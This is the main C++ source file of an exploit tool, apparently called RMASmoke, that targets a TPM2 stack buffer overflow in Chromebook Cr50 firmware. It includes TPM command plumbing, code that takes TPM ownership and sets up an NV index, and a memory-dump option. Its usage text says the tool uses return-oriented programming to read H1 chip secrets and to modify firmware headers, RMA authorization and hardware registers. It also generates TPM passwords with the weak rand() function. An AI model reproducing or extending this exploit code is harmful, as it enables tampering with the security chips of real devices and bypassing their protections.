/* Massive credits to Writable for discovering the initial vulnerability!
 * RMASmoke is a TPM2 buffer overflow (Microsoft patched it 8 years ago,
 * but the TSS2 authors never got around to it I guess) in Cr50 revisions
 * below 0.5.230 that allows for ACE in the chip after the AP is booted.
 * Despite the capabilities, unto itself the exploit is not very powerful,
 * and is mostly being used as a chain to discover other vulnerabilities.
 *
 * Rewritten with love by Hannah <3
 */

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <errno.h>
#include <fcntl.h>
#include <iostream>
#include <linux/types.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <string>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <tss2/tss2_common.h>
#include <tss2/tss2_sys.h>
#include <tss2/tss2_tpm2_types.h>
#include <unistd.h>

#include "args.hh"
#include "chip_config.h"
#include "nvmem.hh"
#include "pb_encode.h"
#include "pb_decode.h"
#include "pb_common.h"
#include "rmasmoke.hh"
#include "rop.hh"
#include "signed_header.h"
#include "tpm_manager.pb.h"
#include "tss_context.h"


int tpm; // /dev/tpm0 file descriptor

typedef struct {
	TPMS_NV_PUBLIC publicArea;
	TPM2B_AUTH authValue;
} NV_INDEX;

int ReadFileToString(std::string path, std::string *data) 
{
	int fd = open(path.c_str(), O_RDONLY);
	if (fd < 0) {
		std::cerr << "Error: Failed to open provided file " << path << std::endl;
		return -1;
	}
	
	data->clear();
	int count = 0;
	do {
		char tempBuf[1024];
		int count = read(fd, tempBuf, 1024);
		if (!count) {
			close(fd);
			return 0;
		}else if (count > 0) {
			data->append(tempBuf, count);
		}else{
			std::cerr << "Error: Failed to read provided file " << path << std::endl;
			return -1;
		}
	} while (count == 0);

	close(fd);
	return 0;
}

void *read_file(const char *path, size_t *size_ptr)
{
    FILE *fp;
	struct stat st;

	if (fbool("--verbose","-v")) std::cout << "Debug: Copying contents of file " << path << " to memory." << std::endl; 
	
    fp = fopen(path, "rb");
    if (!fp) {
        std::cerr << "Error: Failed to open file '" << path << "'. " << strerror(errno) << std::endl;
        exit(1);
    }
	
    if (fstat(fileno(fp), &st)) {
        std::cerr << "Error: Failed to stat file '" << path << "'. " << strerror(errno) << std::endl;
        exit(1);
    }

    void *data = malloc(st.st_size);
    if (!data) {
		std::cerr << "Error: Failed to allocate memory for provided file '" << path << "'. " << strerror(errno) << std::endl;
        exit(1);
    }

    if (fread(data, st.st_size, 1, fp) != 1) {
        std::cerr << "Error: Failed to read file '" << path << "'. " << strerror(errno) << std::endl;
        exit(1);
    }
	
    fclose(fp);

	*size_ptr = st.st_size;
	
    return data;
}

uint32_t SendTPMCommand(tpm_result *buf, size_t len, tpm_result **respBuf,
                        size_t *respLen, int tpmfd) 
{
	if (len > 2048) {
		std::cerr << "Error: TPM command size exceeds 2 kilobytes, this should never happen!" << std::endl;
		return -1;
	}

	int written = write(tpmfd, buf, len);

	if (written != len) {
		printf("Error: written != len; %lu != %d\n with linux rc %s\n", len, written, strerror(errno));
		return -1;
	}
	
	char *responseBuffer = new char[2048];
	char *response = responseBuffer;
	size_t responseLen = 0;
	memset(responseBuffer, 0, 2048);
	int read_count = 0;
	
	if (fbool("--socket","-s")) {
		read_count = read(tpmfd, response, 2048);
	}else{
		do {
			size_t rx_to_go = 2048 - responseLen;
			response = response + responseLen;

			read_count = read(tpmfd, response, rx_to_go);	

			responseLen += read_count;
		} while (read_count);
	}
	
	response = responseBuffer;
	struct tpm_result *pkt = (struct tpm_result *)responseBuffer;
	uint32_t rv;
	memcpy(&rv, &pkt->ordinal, sizeof(rv));
	rv = be32toh(rv);
	if (respBuf) {
		if (!*respBuf)
			*respBuf = (tpm_result *)responseBuffer;
		else
			memcpy(*respBuf, pkt, responseLen);
		
	}
	if (respLen) *respLen = responseLen;
	
	if (fbool("--verbose","-v")) printf("Info: Received response: %0#x with length %lu\n", rv, responseLen);
	return rv;
}

TSS2L_SYS_AUTH_COMMAND generate_auth_token(void)
{
    tpm_manager_LocalData ld = tpm_manager_LocalData_init_default;
    std::string protobufData;
    std::string local_data_path = (fbool("--local_data_path","-l")) ? fval("--local_data_path", "-l", 1) : "/var/lib/tpm_manager/local_tpm_data";

    if (ReadFileToString(local_data_path, &protobufData) != 0) {
		std::cerr << "Error: Failed to open local_tpm_data, try running the commands" << std::endl;
		std::cerr << "  rmasmoke --clear_owner" << std::endl;
		std::cerr << "	rmasmoke --take_ownership" << std::endl;
		std::cerr << "to generate it." << std::endl;
		exit(1);
	}

    // Nanopb decoding
    pb_istream_t stream = pb_istream_from_buffer((uint8_t*)protobufData.data(), protobufData.size());
    if (!pb_decode(&stream, tpm_manager_LocalData_fields, &ld)) {
        std::cerr << "Error: Nanopb decoding failed: " << PB_GET_ERROR(&stream) << std::endl;
        exit(1);
    }

    // Accessing bytes in Nanopb (assumes fixed size or nanopb-managed allocation)
    char *owner_password = (char *)ld.owner_password.bytes;
    size_t owner_password_len = ld.owner_password.size;
    
    TPMS_AUTH_COMMAND authcmd = {};
    authcmd.hmac.size = (UINT16)owner_password_len;
    memcpy(authcmd.hmac.buffer, owner_password, owner_password_len);
    
    authcmd.nonce = {0, {}};
    authcmd.sessionAttributes = TPMA_SESSION_CONTINUESESSION;
    authcmd.sessionHandle = TPM2_RS_PW;
    TSS2L_SYS_AUTH_COMMAND cmd = {1, {authcmd}};

    return cmd;
}


TSS2L_SYS_AUTH_COMMAND start_auth_session(void)
{
	TSS2L_SYS_AUTH_COMMAND cmdAuths;
	cmdAuths.count = 1;
    memset(&cmdAuths.auths[0], 0, sizeof(TPMS_AUTH_COMMAND));

	cmdAuths.auths[0].sessionHandle = TPM2_RS_PW;
    cmdAuths.auths[0].nonce.size = 0;
    cmdAuths.auths[0].sessionAttributes = 0;

	return cmdAuths;
}

// TODO: Use /dev/random?
std::string generate_rand(int size)
{
	std::string str;
    for (int i = 0; i < size; i++) {
        auto d = rand() % 26 + 'a';
        str.push_back(d);
    }

	return str;
}

inline constexpr const char* kInitialTpmOwnerDependencies[] = {
    "TpmOwnerDependency_Nvram", "TpmOwnerDependency_Attestation",
    "TpmOwnerDependency_Bootlockbox"
};

int tpm_take_ownership(void)
{
    tpm_manager_LocalData ld = tpm_manager_LocalData_init_default;
    std::string protobufData;
    std::string local_data_path = (fbool("--local_data_path","-l")) ? fval("--local_data_path","-l", 1) : "/var/lib/tpm_manager/local_tpm_data";

    if (ReadFileToString(local_data_path, &protobufData) != 0) {
		std::cerr << "Error: Failed to read local data at " << local_data_path << std::endl;
		return 1;
	}

    pb_istream_t istream = pb_istream_from_buffer((uint8_t*)protobufData.data(), protobufData.size());
    pb_decode(&istream, tpm_manager_LocalData_fields, &ld);
    

    if (ld.owner_dependency_count <= 0) {
        ld.owner_dependency_count = 3;
        strcpy(ld.owner_dependency[0], "TpmOwnerDependency_Nvram");
        strcpy(ld.owner_dependency[1], "TpmOwnerDependency_Attestation");
        strcpy(ld.owner_dependency[2], "TpmOwnerDependency_Bootlockbox");

        std::string op = generate_rand(20);
        ld.owner_password.size = op.size();
        memcpy(ld.owner_password.bytes, op.data(), op.size());

        std::string ep = generate_rand(40);
        ld.endorsement_password.size = ep.size();
        memcpy(ld.endorsement_password.bytes, ep.data(), ep.size());

        std::string lp = generate_rand(40);
        ld.lockout_password.size = lp.size();
        memcpy(ld.lockout_password.bytes, lp.data(), lp.size());
    }

    uint8_t buffer[1024];
    pb_ostream_t ostream = pb_ostream_from_buffer(buffer, sizeof(buffer));
    if (!pb_encode(&ostream, tpm_manager_LocalData_fields, &ld)) {
        std::cerr << "Error: Nanopb encoding failed: " << PB_GET_ERROR(&ostream) << std::endl;
        return 1;
    }

    FILE *fp = fopen(local_data_path.c_str(), "wb");
    fwrite(buffer, 1, ostream.bytes_written, fp);
    fclose(fp);

    nvmem_set_hierarchy(std::string((char*)ld.owner_password.bytes, ld.owner_password.size),
                        std::string((char*)ld.endorsement_password.bytes, ld.endorsement_password.size),
                        std::string((char*)ld.lockout_password.bytes, ld.lockout_password.size));

    return 0;
}

void show_info(int esc)
{
	printf("Usage: %s [args]\n"
		"RMASmoke is a tool (written by Writable and greatly improved by Hannah) designed to exploit\n"
		"a stack buffer overflow present in TPM2, which is utilized by the Cr50 firmware present on\n"
		"nearly every Chromebook manufactured since 2019, with the goal of using return-oriented-programming\n"
		"to gain out-of-bounds read/write in the H1 chip, and use this control to read on-board secrets\n"
		"(e.g. the BootROM) or modify important values (e.g. Firmware headers, RMA auth, and hardware registers)\n"
		"\n"
		"Arguments:\n"
		"-h, --help: Show this help and exit\n"
		"-V, --version [0.5.*]: Specify the Cr50 version to test under\n"
		"-s, --socket [/dev/tpm#]: Specify a TPM2 socket instead of /dev/tpm0\n" /* For testing */
		"-u, --startup: Start TPM2 if it hasn't already been started\n" /* For tpm2-simulator */
		"-o, --take_ownership: Take ownership of the TPM and generate local_tpm_data\n"
		"-p, --setup: Setup the necessary index for RMASmoke to operate\n"
		"-l, --local_data_path [path]: Specify the path to the local_tpm_data to be used in authorization\n"
		"-D, --dump_mem <addr> <length>: Dump any memory on the H1 to the CCD console\n"
		"-C, --cleanup: Cleanup indexes created by RMASmoke\n"
		"-v, --verbose: Show extra debug output\n"
		"\n", gargv[0]);
	exit(esc);
}

int main(int argc, char **argv)
{
	// Save me some time and make command line arguments global
	gargc = argc;
	gargv = argv;

	if (argc < 2) {
		std::cerr << "Error: Expected more arguments." << std::endl;
		show_info(1);
	}
	if (fbool("--help","-h")) show_info(0);

	if (getuid() != 0) {
		std::cerr << "Error: RMASmoke must be run as root." << std::endl;
		return 1;
	}

	std::string socket = (fbool("--socket","-s")) ? fval("--socket","-s", 1) : "/dev/tpm0";

	tpm = open(socket.c_str(), O_RDWR);
	if (tpm < 0) {
		std::cerr << "Error: Failed to connect to TPM, cannot continue." << std::endl;
		return 1;
	}



	if (fbool("--startup","-u")) {
		std::cout << "Info: Sending startup command to TPM." << std::endl;
		tpm_startup();
	}

	if (fbool("--take_ownership","-o")) {
		std::cout << "Info: Taking TPM ownership." << std::endl;
		if (tpm_take_ownership() != 0) {
			std::cerr << "Erorr: Failed to take TPM ownership." << std::endl;
			return 1;
		}
	}

	if (fbool("--dump_mem","-D")) {
		uint32_t addr, len;
		addr = strtoul(fval("--dump_mem","-D", 1).c_str(), nullptr, 0);
		len = strtoul(fval("--dump_mem","-D", 2).c_str(), nullptr, 0);
		
		std::cout << "Dumping provided memory ranges to console." << std::endl;
		dump_memory_range(addr, len);
	}

	if (fbool("--setup","-p")) {
		std::cout << "Info: Setting up needed index. The NV space password is 'default password'." << std::endl;

		TPM2B_NV_PUBLIC pub;
		memset(&pub, 0, sizeof(pub));
		UINT32 nvidx = (UINT32)(0x80000A);
		pub.nvPublic.attributes = TPMA_NV_OWNERREAD | TPMA_NV_OWNERWRITE | TPMA_NV_AUTHREAD | TPMA_NV_AUTHWRITE;
		pub.nvPublic.dataSize = 2048;
		pub.nvPublic.nameAlg = TPM2_ALG_SHA256;
		pub.nvPublic.authPolicy.size = 0;
		pub.nvPublic.nvIndex = TPM2_NV_INDEX_FIRST + nvidx;
		pub.size = sizeof(TPM2B_NV_PUBLIC);

		nvmem_define(0x80000A, &pub);
	}

	if (fbool("--cleanup","-C")) {
		std::cout << "Info: Cleaning up NV space 0x80000A." << std::endl;
		nvmem_undefine(0x80000A);
	}

	close(tpm);

	return 0;
}
